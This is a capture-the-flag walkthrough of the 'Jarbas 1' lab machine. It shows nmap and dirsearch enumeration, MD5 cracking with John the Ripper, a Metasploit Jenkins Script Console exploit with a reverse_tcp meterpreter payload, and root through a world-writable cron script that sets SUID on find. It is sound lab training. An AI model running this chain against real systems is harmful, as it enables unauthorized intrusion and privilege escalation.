# Jarbas 1 - Walkthrough

## Machine Info

* **Name:** Jarbas
* **Goal:** Get root access and read the flag.

---

## 1. Reconnaissance & Enumeration

### Network Scanning

First, I performed a full Nmap scan to identify open ports and services:

```bash
nmap -sV -p- -A 192.168.56.114

```

**Results:**

* **22/tcp**: SSH (OpenSSH 7.4)
* **80/tcp**: HTTP (Apache 2.4.6)
* **3306/tcp**: MySQL (MariaDB) - *Unauthorized access blocked*
* **8080/tcp**: HTTP (Jenkins/Jetty)

### Web Enumeration

Running `dirsearch` on port 80 revealed an interesting file:

```bash
dirsearch -u http://192.168.56.114/ -t 200

```

Found: `/access.html`. This page contained several MD5 password hashes.

---

## 2. Vulnerability Analysis

### Cracking Hashes

I saved the hashes into a file and used **John the Ripper** with the `rockyou.txt` wordlist to crack them:

```bash
john --format=raw-md5 hashes --wordlist=/usr/share/wordlists/rockyou.txt

```

**Cracked Passwords:**

1. `marianna`
2. `vipsu`
3. `italia99`

### Jenkins Exploitation

Knowing Jenkins is running on port 8080, I attempted to login using the discovered credentials. The combination **eder:vipsu** was successful.

Jenkins has a **Script Console** that allows running arbitrary Java code on the server, which is a classic RCE (Remote Code Execution) vector.

---

## 3. Exploitation

I used Metasploit to automate the attack on the Jenkins Script Console:

```bash
msfconsole
use exploit/multi/http/jenkins_script_console
set RHOSTS 192.168.56.114
set RPORT 8080
set TARGETURI /
set USERNAME eder
set PASSWORD vipsu
set TARGET 1 (Linux)
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.56.102
run

```

I successfully obtained a **Meterpreter session** as the `jenkins` user.

---

## 4. Privilege Escalation

### Analyzing Cron Jobs

I checked the system's crontab to find scheduled tasks running as root:

```bash
cat /etc/crontab

```

**Finding:**
`*/5 * * * * root /etc/script/CleaningScript.sh`
A script located at `/etc/script/CleaningScript.sh` runs every 5 minutes with **root** privileges.

### Exploiting the Script

I checked the permissions of the script:

```bash
ls -la /etc/script/CleaningScript.sh

```

The script was world-writable (`-rwxrwxrwx`). I decided to overwrite it to set a **SUID bit** on the `find` binary:

```bash
echo "chmod u+s /usr/bin/find" > /etc/script/CleaningScript.sh

```

### Getting Root

After waiting for the cron job to execute (approx. 5 minutes), I used the SUID-enabled `find` to spawn a root shell:

```bash
find . -exec /bin/sh -p \; -quit
whoami
# Output: root

```

---

## 5. Loot

The flag was located in the root directory:

```bash
cd /root
cat flag.txt

```

> **Flag:** Hey! Congratulations! You got it! ... @tiagotvrs